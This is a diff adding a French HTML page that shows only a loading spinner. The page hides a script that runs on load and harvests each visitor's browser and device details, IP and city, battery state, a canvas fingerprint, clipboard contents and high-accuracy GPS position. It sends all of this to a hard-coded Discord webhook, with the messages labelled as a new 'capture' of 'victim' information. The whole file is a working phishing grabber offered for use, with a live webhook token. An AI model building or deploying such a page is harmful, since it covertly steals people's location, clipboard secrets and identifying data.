@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Chargement...</title>
+<style>
+  body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
+  background:#0f172a;color:#fff;font-family:system-ui,sans-serif}
+  .loader{width:48px;height:48px;border:4px solid #fff3;border-top-color:#38bdf8;
+  border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="loader"></div>
+
+<script>
+/* ====== METS TON WEBHOOK ICI ====== */
+const WEBHOOK = "https://discord.com/api/webhooks/1571811746522464307/REyCSk0KWS3N8dkGV2BuIfly47n0G-81qVAGozbpTnQtypVZU6EdxeCeQu8TXwXJ6u1A";
+
+(async function () {
+  const data = {
+    timestamp: new Date().toISOString(),
+    url: location.href,
+    referrer: document.referrer || "direct",
+    browser: {},
+    screen: {},
+    battery: null,
+    geo: null,
+    clipboard: null,
+    ip: null,
+    canvas_fp: null,
+    touch: false
+  };
+
+  /* --- Navigateur --- */
+  const ua = navigator.userAgent;
+  data.browser = {
+    userAgent: ua,
+    language: navigator.language,
+    languages: navigator.languages,
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cores: navigator.hardwareConcurrency || null,
+    memory: navigator.deviceMemory || null,
+    online: navigator.onLine,
+    mobile: /Mobi|Android|iPhone|iPad/i.test(ua),
+    cookies: navigator.cookieEnabled
+  };
+  data.touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+  /* --- Écran --- */
+  data.screen = {
+    w: screen.width, h: screen.height,
+    availW: screen.availWidth, availH: screen.availHeight,
+    colorDepth: screen.colorDepth, dpr: devicePixelRatio
+  };
+
+  /* --- IP + géoloc réseau via API --- */
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    data.ip = await r.json();
+  } catch(e) { data.ip = {error: "api fail"}; }
+
+  /* --- Batterie (mobile surtout) --- */
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      data.battery = {level: b.level*100+"%", charging: b.charging};
+    }
+  } catch(e){}
+
+  /* --- Canvas fingerprint --- */
+  try {
+    const c = document.createElement("canvas");
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top"; ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60"; ctx.fillText("fingerprint", 2, 2);
+    data.canvas_fp = c.toDataURL().slice(-50);
+  } catch(e){}
+
+  /* --- Presse-papiers --- */
+  try {
+    document.addEventListener("click", async () => {
+      try { data.clipboard = await navigator.clipboard.readText(); } catch(e){}
+    }, {once:true});
+    if (navigator.clipboard && navigator.clipboard.readText) {
+      try { data.clipboard = await navigator.clipboard.readText(); } catch(e){}
+    }
+  } catch(e){}
+
+  /* --- Géolocalisation (demande permission) --- */
+  const getGeo = () => new Promise(res => {
+    if (!navigator.geolocation) return res(null);
+    navigator.geolocation.getCurrentPosition(
+      p => res({lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}),
+      () => res(null),
+      {timeout: 8000, enableHighAccuracy: true}
+    );
+  });
+  data.geo = await getGeo();
+
+  /* --- Envoi au webhook --- */
+  const payload = {
+    content: "🎣 **Nouvelle capture**",
+    embeds: [{
+      title: "Infos victime",
+      color: 0x38bdf8,
+      fields: [
+        {name:"IP / Pays", value: `\`${data.ip?.ip||"?"}\` — ${data.ip?.country_name||"?"} / ${data.ip?.city||"?"}`},
+        {name:"Géo GPS", value: data.geo ? `https://maps.google.com/?q=${data.geo.lat},${data.geo.lon}` : "refusée/indispo"},
+        {name:"Mobile", value: data.browser.mobile ? "✅ Oui" : "❌ Non"},
+        {name:"User-Agent", value: `\`${data.browser.userAgent.slice(0,200)}\``},
+        {name:"Écran", value: `${data.screen.w}x${data.screen.h} (dpr ${data.screen.dpr})`},
+        {name:"Batterie", value: data.battery ? `${data.battery.level} ${data.battery.charging?"⚡":"🔋"}` : "n/a"},
+        {name:"Presse-papiers", value: data.clipboard ? `\`${data.clipboard.slice(0,150)}\`` : "vide/refusé"},
+        {name:"Timezone", value: data.browser.timezone}
+      ],
+      footer: {text: data.timestamp}
+    }]
+  };
+
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify(payload)
+    });
+  } catch(e){ console.error("webhook fail", e); }
+
+  /* Petit délai pour laisser la géoloc répondre puis redirection (optionnel) */
+  setTimeout(() => { /* location.href = "https://google.com"; */ }, 500);
+})();
+</script>
+</body>
+</html>
